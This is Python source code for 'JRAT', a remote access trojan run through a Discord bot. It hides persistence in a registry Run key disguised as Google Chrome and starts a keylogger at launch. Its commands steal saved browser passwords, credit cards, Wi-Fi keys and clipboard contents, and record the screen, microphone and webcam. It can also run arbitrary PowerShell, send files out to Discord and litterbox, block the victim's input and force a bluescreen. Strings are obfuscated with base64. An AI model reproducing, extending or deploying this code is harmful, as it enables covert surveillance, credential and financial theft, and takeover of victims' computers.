TOKEN = ""

ADMIN = ""
ACTIVITY_LOG = True
ACTIVITY_CHANNEL_ID = 0000000000000000000







import PIL.ImageDraw
import PIL.BmpImagePlugin

import discord
from discord.ext import commands

import PIL
import tempfile
from datetime import datetime, timedelta
import pyautogui
from pynput import keyboard, mouse
import urllib.request
import zipfile

import os
import sys
import shutil
import subprocess
import psutil
import win32api
import winreg
import ctypes
import socket
import aiohttp
import threading
import asyncio
import time
 
import random
import string

import cv2
import platform
import re
import uuid
import psutil

import base64

import resources.jrat_utils as jrat_utils
from resources.uac_bypass import *
from resources.rec import start_rec
from resources.wifipw import get_wifis_formatted
from resources.audio_rec import record_audio, record_system
from resources.clipboard import getClipboard
from resources.geolocation import get_geo_data
from resources.keylogger import *
from resources.specinfo import get_device_specs, get_device_specs_raw
from resources.litterbox import send_limited

from resources.browser_data.passes import get_pass_formatted
from resources.browser_data.cc import get_cc_formatted

import resources.help as help

VERSION_DATE = "10/9/2024" # DD/MM/YYYY


def d(x):
    return base64.b64decode(x).decode('utf-8')

def cipher_data(x):
    return base64.b64encode(x.encode('utf-8')).decode('utf-8')[::-1] # reversed base64

def decipher_data(x):
    return base64.b64decode(x[::-1]).decode('utf-8')

def get_exe_path(exe_name):
    if getattr(sys, "frozen", False):
        application_path = os.path.join(sys._MEIPASS, exe_name + ".exe")
    else:
        application_path = exe_name
    return application_path

temp_dir = tempfile.gettempdir()
this_file = sys.argv[0]

def replicate(paths : list[str]):
    try:
        for path in paths:
            if not os.path.isfile(path + os.path.basename(this_file)):
                shutil.copy(this_file, path)
    except:
        pass

def run_on_startup_init():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, d("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"))

        winreg.SetValueEx(key, d("R29vZ2xlIENocm9tZSBBLkwu"), 0, winreg.REG_SZ, os.environ["PROGRAMDATA"]+"\\"+os.path.basename(this_file))
    except Exception as e:
        print(f"Error creating string value: {e}")
    finally:
        winreg.CloseKey(key)

def uac():
    try:
        if not IsAdmin():
            if GetSelf()[1]:
                if UACbypass(n=os.path.basename(this_file)):
                    print("Attempting bypass... Exiting.")
                    os._exit(0)
        else:
            print("ADMIN GRANTED")
    except Exception as e:
        pass


if os.path.basename(this_file).endswith(".exe"): # *.exe
    replicate([os.environ["PROGRAMDATA"]])
    run_on_startup_init()
else: # *.py
    print("[+]::RUNNING DEBUG MODE::[+]")
# uac()

#UAC bypassed here.

try: startKeyLog()
except: ...

blocked_input = "NONE"

def add_folder_to_zip(zip_file, folder):
    for dirname, subdirs, files in os.walk(folder):
        for filename in files:
            file_path = os.path.join(dirname, filename)
            arcname = os.path.relpath(file_path, folder)
            zip_file.write(file_path, arcname)

def create_zip_file(zip_filename, files=[], folders=[]):
    with zipfile.ZipFile(temp_dir+f"\{zip_filename}", 'w', compression = zipfile.ZIP_DEFLATED) as my_zip_file:
        for file in files:
            my_zip_file.write(file)
        for folder in folders:
            add_folder_to_zip(my_zip_file, folder)

        return my_zip_file

def get_username():
    return os.getlogin()

description = '''V2VsY29tZSB0byBKUkFUIC0gQW4gYWR2YW5jZWQgdW5kZXRlY3RlZCBSQVQgbWFsd2FyZSBmdWxseSB3cml0dGVuIGluIFB5dGhvbiwgQ29udHJvbGxlZCB0aHJvdWdoIGEgRGlzY29yZCBCb3QuIEhhdmUgZnVuLg=='''

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='?', description=d(description), intents=intents, help_command=help.MyHelp())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print('------')

    if ACTIVITY_LOG:
        try:
            gmt3 = datetime.utcnow() + timedelta(hours=3)
            channel = bot.get_channel(ACTIVITY_CHANNEL_ID)
            admin_msg = "Running as Administrator." if IsAdmin() else "Not running as Administrator."
            await channel.send(f"> [{gmt3:%H:%M:%S}]: **`{get_username()}/{socket.gethostname()}`** is now online. {admin_msg}")
        except Exception as e:
            print(e)
            
@bot.command()
async def isadmin(ctx, pc_name : str):
    '''Returns True if the app ran with administrator permissions. 
    ```md
    ?isadmin <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            await ctx.send(str(IsAdmin()))
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def idletime(ctx, pc_name : str):
    '''Returns the idle time of the victim.
    ```md
    ?idletime <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            try:
                idle_time = (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0
                await ctx.send(f"`{get_username()}/{socket.gethostname()}` has been idle for {idle_time} (s)")
            except Exception as e:
                await ctx.send(f"Failed getting idle time: {e}")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def blockinput(ctx, pc_name : str, type = "all"):
    '''Blocks all mouse/keyboard input in the victim's computer.
    ```md
    ?blockinput <user> <type [all, keyboard, mouse]>
    ```
    '''
    global blocked_input, keyboard_listener, mouse_listener
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            try:
                keyboard_listener = keyboard.Listener(suppress=True)
                mouse_listener = mouse.Listener(suppress=True)
                if type.lower() == "all":
                    keyboard_listener.start()
                    mouse_listener.start()
                    blocked_input = "all"

                    await ctx.send("Mouse and Keyboard blocked successfully.")

                elif type.lower() == "mouse":
                    mouse_listener.start()
                    blocked_input = "mouse"
                    await ctx.send("Mouse blocked successfully.")

                elif type.lower() == "keyboard":
                    keyboard_listener.start()
                    blocked_input = "keyboard"
                    await ctx.send("Keyboard blocked successfully.")

                else:
                    await ctx.send("Invalid <type> argument. `?blockinput <user> <type [all, keyboard, mouse]>`")
            except Exception as e:
                await ctx.send(f"Error blocking input.\n\n{e}")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def unblockinput(ctx, pc_name : str, type = "all"):
    '''Unblocks mouse/keyboard input in the victim's computer.
    ```md
    ?unblockinput <user> <type [all, keyboard, mouse]>
    ```
    '''
    global blocked_input, keyboard_listener, mouse_listener
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            try:
                if type.lower() == "all":
                    keyboard_listener.stop()
                    mouse_listener.stop()
                    blocked_input = "NONE"
                    await ctx.send("Mouse and Keyboard unblocked successfully.")
                    
                elif type.lower() == "mouse":
                    mouse_listener.stop()
                    if blocked_input == "all":
                        blocked_input = "keyboard"
                    await ctx.send("Mouse unblocked successfully.")

                elif type.lower() == "keyboard":
                    keyboard_listener.stop()
                    if blocked_input == "all":
                        blocked_input = "mouse"
                    await ctx.send("Keyboard unblocked successfully.")

                else:
                    await ctx.send("Invalid <type> argument. `?unblockinput <user> <type [all, keyboard, mouse]>`")
            except Exception as e:
                await ctx.send(f"Error unblocking input.\n\n{e}")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...


@bot.command()
async def blockedinput(ctx, pc_name : str):
    '''Returns the blocked input in the victim's computer (if blocked).
    ```md
    ?blockedinput <user>
    ```
    '''
    global blocked_input
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            try:

                if blocked_input == "all":
                    await ctx.send(f"`{get_username()}`: Mouse and Keyboard are blocked.")
                elif blocked_input == "mouse":
                    await ctx.send(f"`{get_username()}`: Mouse is blocked.")
                elif blocked_input == "keyboard":
                    await ctx.send(f"`{get_username()}`: Keyboard is blocked.")
                else:
                    await ctx.send(f"`{get_username()}`: Nothing is blocked.")

            except Exception as e:
                await ctx.send(f"Error getting blocked input.\n\n{e}")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def ss(ctx, pc_name : str):
    '''Takes a screenshot of the victim's screen (All monitors combined).
    ```md
    ?ss <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            path = f'{temp_dir}\\ss_disc.png'
            ss = PIL.ImageGrab.grab(all_screens=True)

            draw = PIL.ImageDraw.Draw(ss)
            center_x, center_y = pyautogui.position()
            radius = 5
            draw.ellipse([(center_x - radius, center_y - radius), (center_x + radius, center_y + radius)], outline="black", fill="white", width=2)
            draw.text((center_x, center_y + 15), f"{center_x, center_y}", fill='white', stroke_width=2, stroke_fill="black")
            

            ss.save(path)
            ss.close()
            await ctx.send(file=discord.File(path))

            if os.path.isfile(path):
                os.remove(path)
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def getpass(ctx, pc_name : str):
    '''Returns the victim's saved passwords.
    ```md
    ?getpass <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            with open(f"{temp_dir}\\pass.txt", "w", encoding=d("dXRmLTg=")) as file:
                file.write(get_pass_formatted())

            with open(f"{temp_dir}\\pass.txt", "rb") as file:
                await ctx.send(file=discord.File(file, "pass.txt"))

            if os.path.isfile(f"{temp_dir}\\pass.txt"):
                os.remove(f"{temp_dir}\\pass.txt")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...


@bot.command()
async def getcc(ctx, pc_name : str):
    '''Returns the victim's saved cc.
    ```md
    ?getcc <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            with open(f"{temp_dir}\\cc.txt", "w", encoding=d("dXRmLTg=")) as file:
                file.write(get_cc_formatted())

            with open(f"{temp_dir}\\cc.txt", "rb") as file:
                await ctx.send(file=discord.File(file, "cc.txt"))

            if os.path.isfile(f"{temp_dir}\\cc.txt"):
                os.remove(f"{temp_dir}\\cc.txt")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def getwifipass(ctx, pc_name : str):
    '''Returns the victim's saved Wi-Fi passwords.
    ```md
    ?getwifipass <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            pws = get_wifis_formatted()

            if pws != "NONE":
                with open(f"{temp_dir}\\pass.txt", "w", encoding=d("dXRmLTg=")) as file:
                    print(pws)
                    file.write(pws)

                with open(f"{temp_dir}\\pass.txt", "rb") as file:
                    await ctx.send(file=discord.File(file, "wifi-pass.txt"))

                if os.path.isfile(f"{temp_dir}\\pass.txt"):
                    os.remove(f"{temp_dir}\\pass.txt")
            else:
                await ctx.send("No Wi-Fi passwords were found.")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def record_screen(ctx, pc_name : str):
    '''Returns a 15 seconds video record of the victims screen (All monitors combined).
    ```md
    ?record_screen <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            msg = await ctx.send("Recording Video...")

            start_rec(f"{temp_dir}\\rec.mp4")

            await msg.delete()
            await ctx.send(file=discord.File(f"{temp_dir}\\rec.mp4", "Video.mp4"))

            if os.path.isfile(f"{temp_dir}\\rec.mp4"):
                os.remove(f"{temp_dir}\\rec.mp4")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def record_mic(ctx, pc_name : str):
    '''Returns a 15 seconds audio record of the victims microphone. **CAREFUL THIS WILL TRIGGER AN INDICATOR**
    ```md
    ?record_mic <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            msg = await ctx.send("Recording Microphone...")

            record_audio(output_file=f"{temp_dir}\\micrec.mp3")

            await msg.delete()
            await ctx.send(file=discord.File(f"{temp_dir}\\micrec.mp3", "audio.mp3"))

            if os.path.isfile(f"{temp_dir}\\micrec.mp3"):
                os.remove(f"{temp_dir}\\micrec.mp3")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def record_sys_audio(ctx, pc_name : str):
    '''Returns a 15 seconds audio record of the victim's system audio (desktop).
    ```md
    ?record_sys_audio <user>
    ```
    '''
    try:
        if pc_name == get_username() or pc_name == socket.gethostname():
            msg = await ctx.send("Recording System...")

            record_system(output_path=f"{temp_dir}\\sysrec.mp3")

            await msg.delete()
            await ctx.send(file=discord.File(f"{temp_dir}\\sysrec.mp3", "audio.mp3"))

            if os.path.isfile(f"{temp_dir}\\sysrec.mp3"):
                os.remove(f"{temp_dir}\\sysrec.mp3")
    except Exception as e:
        try:
            await ctx.send(e)
        except: ...

@bot.command()
async def shell(ctx, pc_name, *, command : str):
    '''Runs a shell command inside the victim's computer.
    ```md
    ?shell <user> <command*>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():

        try:
            result = subprocess.run([d("Y2hjcA=="),d("NjUwMDE="),d("Pk5VTA=="),d("Jg=="),os.environ[d("U1lTVEVNUk9PVA==")]+d("XHN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGU="), command], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))

            if result.returncode == 0:
                if len(result.stdout.strip()) > 0:
                    with open(f"{temp_dir}\\tm.txt", "w", encoding=d("dXRmLTg=")) as file:
                        file.write(result.stdout.strip())

                    with open(f"{temp_dir}\\tm.txt", "rb") as file:
                        await ctx.send(file=discord.File(file, "output.txt"))

                    if os.path.isfile(f"{temp_dir}\\tm.txt"):
                        os.remove(f"{temp_dir}\\tm.txt")
                else:
                    await ctx.send("Shell executed successfully.")
            else:
                with open(f"{temp_dir}\\tm.txt", "w", encoding=d("dXRmLTg=")) as file:
                    file.write(f"SHELL ERROR:\n{result.stderr.strip()}")

                with open(f"{temp_dir}\\tm.txt", "rb") as file:
                    await ctx.send(file=discord.File(file, "output.txt"))

                if os.path.isfile(f"{temp_dir}\\tm.txt"):
                    os.remove(f"{temp_dir}\\tm.txt")
        except Exception as e:
            await ctx.send(f"Error\n\n{e}")

@bot.command()
async def geolocate(ctx, pc_name):
    '''Returns the real-world geographic location (estimate) of the victim's computer.
    ```md
    ?geolocate <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            data, status = get_geo_data()
            msg = ""
            if status == "success":
                msg += f"IP: `{data['ip']}`" + "\n"
                msg += f"ISP: `{data['isp']}`" + "\n"
                msg += f"AS: `{data['as']}`" + "\n\n"
                msg += f"Country: `{data['country']}`" + "\n"
                msg += f"Region: `{data['region']}`" + "\n"
                msg += f"City: `{data['city']}`" + "\n"
                msg += f"Zip Code: `{data['zip']}`" + "\n\n"
                msg += f"[Google Maps Location](http://www.google.com/maps/place/{data['latitude']},{data['longitude']})" + "\n"

                embed  = discord.Embed(title=f"{get_username()}/{socket.gethostname()}",description=msg)


                country_code = data['country_code']
                embed.set_thumbnail(url=f'https://flagsapi.com/{country_code}/flat/64.png')

                await ctx.send(embed=embed)
            else:
                await ctx.send("Failed getting geolocation data.")
        except Exception as e:
            await ctx.send(f"Error getting geolcation data.\n\n{e}")


@bot.command()
async def es(ctx, pc_name, *, search_string : str):
    '''Runs a es command `[es.exe {search_string*} -full-path-and-name -ext -size` (Everything.exe app) and scans the entire victim's computer for specific files/folders.
    ```md
    ?es <user> <search_string*>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():

        try:
            command = rf'{search_string} -full-path-and-name -ext -size'
            path = get_exe_path("es")
            result = subprocess.run([d("Y2hjcA=="),d("NjUwMDE="),d("Pk5VTA=="),d("Jg=="),os.environ[d("U1lTVEVNUk9PVA==")]+d("XHN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGU="),path , command], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))

            with open(f"{temp_dir}\\tm.txt", "w", encoding=d("dXRmLTg=")) as file:
                file.write(result.stdout.strip())

            with open(f"{temp_dir}\\tm.txt", "rb") as file:
                await ctx.send(file=discord.File(file, "output.txt"))

            if os.path.isfile(f"{temp_dir}\\tm.txt"):
                os.remove(f"{temp_dir}\\tm.txt")
        except Exception as e:
            await ctx.send(f"Error\n\n{e}")

@bot.command()
async def es_custom(ctx, pc_name, *, command : str):
    '''Runs a custom es command `es.exe {command*}` (Everything.exe app) and scans the entire victim's computer for specific files/folders.
    ```md
    ?es_custom <user> <command*>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():

        try:
            path = get_exe_path("es")
            result = subprocess.run([d("Y2hjcA=="),d("NjUwMDE="),d("Pk5VTA=="),d("Jg=="),os.environ[d("U1lTVEVNUk9PVA==")]+d("XHN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGU="),path , command], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))

            with open(f"{temp_dir}\\tm.txt", "w", encoding=d("dXRmLTg=")) as file:
                file.write(result.stdout.strip())

            with open(f"{temp_dir}\\tm.txt", "rb") as file:
                await ctx.send(file=discord.File(file, "output.txt"))

            if os.path.isfile(f"{temp_dir}\\tm.txt"):
                os.remove(f"{temp_dir}\\tm.txt")
        except Exception as e:
            await ctx.send(f"Error\n\n{e}")


@bot.command()
async def tree(ctx, pc_name, *, path : str):
    '''Shows the tree structure of the path given.
    ```md
    ?tree <user> <path>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():

        try:
            result = subprocess.run([d("Y2hjcA=="),d("NjUwMDE="),d("Pk5VTA=="),d("Jg=="),os.environ[d("U1lTVEVNUk9PVA==")]+d("XHN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGU="), "tree", path, "/F"], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))
            
            output = result.stdout
            output = "\n".join(output.splitlines()[2:]) # remove first two lines
            result = "┌📂 " + output.replace("????", "├───┬📂 ")
            result = result.replace("?", "│")

            with open(f"{temp_dir}\\tm.txt", "w", encoding=d("dXRmLTg=")) as file:
                file.write(result)

            with open(f"{temp_dir}\\tm.txt", "rb") as file:
                await ctx.send(file=discord.File(file, "output.txt"))

            if os.path.isfile(f"{temp_dir}\\tm.txt"):
                os.remove(f"{temp_dir}\\tm.txt")
        except Exception as e:
            await ctx.send(f"Error\n\n{e}")



@bot.command()
async def getclipboard(ctx, pc_name):
    '''Returns the clipboard of the victim's computer.
    ```md
    ?getclipboard <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            data = getClipboard()

            if isinstance(data, PIL.BmpImagePlugin.BmpImageFile):
                data.save(f'{temp_dir}\\clipboard.png', 'PNG')

                await ctx.send(file=discord.File(f'{temp_dir}\\clipboard.png'))

                if os.path.isfile(f'{temp_dir}\\clipboard.png'):
                    os.remove(f'{temp_dir}\\clipboard.png')
            else:
                if len(data) > 1990:
                    with open(f"{temp_dir}\\clipboard.txt", "w", encoding=d("dXRmLTg=")) as file:
                        file.write(data)

                    with open(f"{temp_dir}\\clipboard.txt", "rb") as file:
                        await ctx.send(file=discord.File(file, "output.txt"))

                    if os.path.isfile(f"{temp_dir}\\clipboard.txt"):
                        os.remove(f"{temp_dir}\\clipboard.txt")
                else:
                    await ctx.send(f"```{data}```")

            
        except Exception as e:
            await ctx.send(f"Error\n\n{e}")

@bot.command()
async def getkeylogs(ctx, pc_name):
    '''Returns the logged keystrokes of the victim's computer since startup.
    ```md
    ?getkeylogs <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            with open(f"{temp_dir}\\conf.txt", "r") as file:
                file_content = file.read()

            with open(f"{temp_dir}\\conf.txt", "w", encoding=d("dXRmLTg=")) as file:
                file.write(decipher_data(file_content))

            with open(f"{temp_dir}\\conf.txt", "rb") as file:
                await ctx.send(file=discord.File(file, "keystrokes.txt"))

            if os.path.isfile(f"{temp_dir}\\conf.txt"):
                os.remove(f"{temp_dir}\\conf.txt")
            
        except Exception as e:
            await ctx.send(f"Error\n\n{e}")

@bot.command()
async def getfile(ctx, pc_name, *, path : str):
    '''Gets a file from the victim's computer based on the given path. (sent in zip format).
    ```md
    ?getfile <user> <path>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():

        try:
            if os.path.isfile(path):
                create_zip_file("output.zip",files=[path])
            elif os.path.isdir(path):
                create_zip_file("output.zip",folders=[path])
            else:
                await ctx.send(f"Failed detecting path.")

            await ctx.send(file=discord.File(f"{temp_dir}\\output.zip", "output.zip"))
            if os.path.isfile(f"{temp_dir}\\output.zip"):
                os.remove(f"{temp_dir}\\output.zip")

        except Exception as e:
            if os.path.isfile(f"{temp_dir}\\output.zip"):
                os.remove(f"{temp_dir}\\output.zip")

            await ctx.send(f"Error\n\n{e}")












#please fix :( (make this threaded)



litterbox_threads = {}

# def threaded(fn):
#     def wrapper(*args, **kwargs):
#         thread = threading.Thread(target=fn, args=args, kwargs=kwargs)
#         thread.start()
#         return thread
#     return wrapper

def get_folder_size(folder_path):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return total_size

async def _send_limited(ctx, filebytes, thread_string, path, zipped_path):
    expire_time = "72h"

    if os.path.getsize(zipped_path) >= 1073741824:
        await ctx.send(f"`#{thread_string}`: File size too large. `[{jrat_utils.format_file_size(os.path.getsize(zipped_path))} / 1 GB]`")
        return

    t = time.time()
    await ctx.send(f"`#{thread_string}`: Upload thread started for `<{path}>`")
    status_code, url_result = send_limited(expire_time, file_bytes=filebytes)

    size = os.path.getsize(path) if os.path.isfile(path) else get_folder_size(path) if os.path.isdir(path) else 0 # file/folder size in bytes

    try:
        if status_code == 200:
            await ctx.send(f"`#{thread_string}`: Upload finished | {time.time() - t : .2f} (s)  | {jrat_utils.format_file_size(size)} → {jrat_utils.format_file_size(os.path.getsize(zipped_path))} | {url_result} | expires in {expire_time}")
        else:
            raise ValueError(f"{status_code}")
    except Exception as e:
        await ctx.send(f"Error uploading file to litterbox, {status_code}, {e}")

    try:
        if os.path.isfile(f"{temp_dir}\\output.zip"):
            os.remove(f"{temp_dir}\\output.zip")
    except:
        ...

@bot.command()
async def litterbox(ctx, pc_name, *, path : str):
    '''Gets a file from the victim's computer based on the given path. (1GB LIMIT).
    ```md
    ?litterbox <user> <path>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():

        try:
            characters = string.ascii_uppercase + string.digits

            thread_string = ''.join(random.choices(characters, k=8))

            size = os.path.getsize(path) if os.path.isfile(path) else get_folder_size(path) if os.path.isdir(path) else 0 # file/folder size in bytes

            msg = await ctx.send(f"`#{thread_string}`: Zipping content... ({jrat_utils.format_file_size(size)})")
            if os.path.isfile(path):
                create_zip_file("output.zip",files=[path])
            elif os.path.isdir(path):
                create_zip_file("output.zip",folders=[path])
            else:
                await ctx.send(f"Failed detecting path.")
            zipped_path = f"{temp_dir}\\output.zip"
            await msg.edit(content=f"`#{thread_string}`: Zipping content... ({jrat_utils.format_file_size(size)} → {jrat_utils.format_file_size(os.path.getsize(zipped_path))})")

            file_bytes = open(f"{temp_dir}\\output.zip", 'rb')


            # thread = threading.Thread(target=_send_limited,args={ctx, file_bytes, thread_string})

            # if thread:
            #     litterbox_threads[thread_string] = thread
            #     thread.start()

            #     await ctx.send(f"`#{thread_string}`: Upload thread started for `<{path}>`")

            
            # await _send_limited(ctx, file_bytes, thread_string, path, f"{temp_dir}\\output.zip") # non-threaded
            asyncio.create_task(_send_limited(ctx, file_bytes, thread_string, path, f"{temp_dir}\\output.zip")) # threaded (asyncio)
                
            # if os.path.isfile(f"{temp_dir}\\output.zip"):
            #     sleep(3)
            #     os.remove(f"{temp_dir}\\output.zip")


        except Exception as e:
            try:
                if os.path.isfile(f"{temp_dir}\\output.zip"):
                    os.remove(f"{temp_dir}\\output.zip")
            except:
                ...

            await ctx.send(f"Error\n\n{e}")
















@bot.command()
async def downloadurl(ctx, pc_name, url, *, path):
    '''Downloads a file by a url to the victim's computer.
    ```md
    ?downloadurl <user> <url> <path>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():

        try:
            msg = await ctx.send("Downloading...")

            def show_progress(block_num, block_size, total_size):
                try:
                    downloaded = block_num * block_size
                    percent_complete = min(100, int(downloaded / total_size * 100))
                    total_mb = total_size / (1024 * 1024)
                    downloaded_mb = downloaded / (1024 * 1024)

                    print(f"Downloaded: {downloaded_mb:.2f} MB / {total_mb:.2f} MB ({percent_complete}%)", end="\r")
                except: ...
            urllib.request.urlretrieve(url, path, show_progress)
            await msg.edit(content=f"File downloaded sucessfully. `{path}` | {jrat_utils.format_file_size(os.path.getsize(path))}")
        except Exception as e:
            await msg.delete()
            await ctx.send(f"Error downloading file.\n{e}")
            

@bot.command()
async def upload(ctx, pc_name, *, path):
    '''Uploads a file via a discord attachment to the victim's computer.
    ```md
    ?upload <user> <path> [MUST INCLUDE FILE ATTACHMENT]
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            if ctx.message.attachments:
                attachment = ctx.message.attachments[0]

                msg = await ctx.send("Uploading file...")

                async with aiohttp.ClientSession() as session:
                    async with session.get(attachment.url) as response:
                        if response.status == 200:
                            data = await response.read()

                            with open(path, "w", newline=None) as file:
                                file.write(data.decode('utf-8').replace('\r\n', '\n').replace('\r', '\n'))
                            await msg.edit(content=f"File downloaded sucessfully. `{path}` | {jrat_utils.format_file_size(os.path.getsize(path))}")
                        else:
                            await ctx.send("Failed to download the attachment.")
            else:
                await ctx.send("No attachment found in the message.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
            

@bot.command()
async def restart(ctx, pc_name):
    '''Restarts the victim's computer.
    ```md
    ?restart <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            subprocess.run(["shutdown", "/r", "/t", "0"], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))
        except Exception as e:
            await ctx.send(f"Error\n\n{e}")

@bot.command()
async def shutdown(ctx, pc_name):
    '''Shutdowns the victim's computer.
    ```md
    ?shutdown <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            subprocess.run(["shutdown", "/s", "/t", "0"], capture_output=True, text=True, shell=True, encoding=d("dXRmLTg="))
        except Exception as e:
            await ctx.send(f"Error\n\n{e}")

@bot.command()
async def webcam(ctx, pc_name, camera_index : int):
    '''Returns a screenshot of the victim's webcam based on the camera index given (Start from 0).
    ```md
    ?webcam <user> <camera_index>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            cam = cv2.VideoCapture(camera_index)
            res, img = cam.read()
            path = f"{temp_dir}\\cam.png"
            if res:
                cv2.imwrite(path,img)
                cam.release()
            else:
                await ctx.send("Camera not found.")

            await ctx.send(file=discord.File(path))

            if os.path.isfile(path):
                os.remove(path)
        except Exception as e:
            await ctx.send(f"Error finding webcam\n\n{e}")

@bot.command()
async def bluescreen(ctx, pc_name):
    '''Shows the blue screen of death to the victim's computer and crashes and **MAY** result in a restart.
    ```md
    ?bluescreen <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        await ctx.send("goodbye.")
        SE_SHUTDOWN_PRIVILEGE = 19
        STATUS_ACCESS_DENIED = 0xC0000022

        tmp1 = ctypes.c_bool()
        ctypes.windll.ntdll.RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, True, False, ctypes.byref(tmp1))

        tmp2 = ctypes.c_uint()
        ctypes.windll.ntdll.NtRaiseHardError(STATUS_ACCESS_DENIED, 0, 0, None, 6, ctypes.byref(tmp2))

@bot.command()
async def killproc(ctx, pc_name, proc_name):
    '''Force kills a process in the victim's computer.
    ```md
    ?killproc <user> <proc_name>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            process = subprocess.Popen(f"taskkill /f /im {proc_name}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if process.returncode == 0:
                await ctx.send(f"`{proc_name}` has been terminated successfully")
            else:
                await ctx.send(f"The process `{proc_name}` was not found.\n\n{stderr.decode()}")

        except Exception as e:
            await ctx.send(f"An error occured while terminating `{proc_name}`.\n\n{e}")

@bot.command()
async def proclist(ctx, pc_name):
    '''Lists all running processes in the victim's computer.
    ```md
    ?proclist <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            proc_list = []
            list_result = ""

            for p in psutil.process_iter():
                path = ""
                try:
                    path = p.cwd()
                except:
                    pass

                proc_list.append([p.name(), p.ppid(),path])

            proc_list = sorted(proc_list)

            list_result += '%-10s%-40s%s' % ("PID","ProcessName","Path") + "\n"
            list_result += '%-10s%-40s%s' % ("---","-----------","----") + "\n"
            for proc in proc_list:
                list_result += '%-10s%-40s%s' % (proc[1],proc[0],proc[2]) + "\n"


            with open(f"{temp_dir}\\proc.txt", "w", encoding=d("dXRmLTg=")) as file:
                file.write(list_result)

            with open(f"{temp_dir}\\proc.txt", "rb") as file:
                await ctx.send(file=discord.File(file, "output.txt"))

            if os.path.isfile(f"{temp_dir}\\proc.txt"):
                os.remove(f"{temp_dir}\\proc.txt")
        except Exception as e:
            await ctx.send(f"An error occured while reading processes.\n\n{e}")


@bot.command()
async def getspecs(ctx, pc_name):
    '''Lists all the important specs found in the victim's computer.
    ```md
    ?getspecs <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            embed  = discord.Embed(title=f"{get_username()}/{socket.gethostname()}",description=get_device_specs())

            await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send(f"An error occured getting pc specs.\n\n{e}")

@bot.command()
async def getspecs_raw(ctx, pc_name):
    '''Lists ALL specs raw information found in the victim's computer.
    ```md
    ?getspecs_raw <user>
    ```
    '''
    if pc_name == get_username() or pc_name == socket.gethostname():
        try:
            with open(f"{temp_dir}\\specs.txt", "w", encoding=d("dXRmLTg=")) as file:
                file.write(get_device_specs_raw())

            with open(f"{temp_dir}\\specs.txt", "rb") as file:
                await ctx.send(file=discord.File(file, "specs.txt"))

            if os.path.isfile(f"{temp_dir}\\specs.txt"):
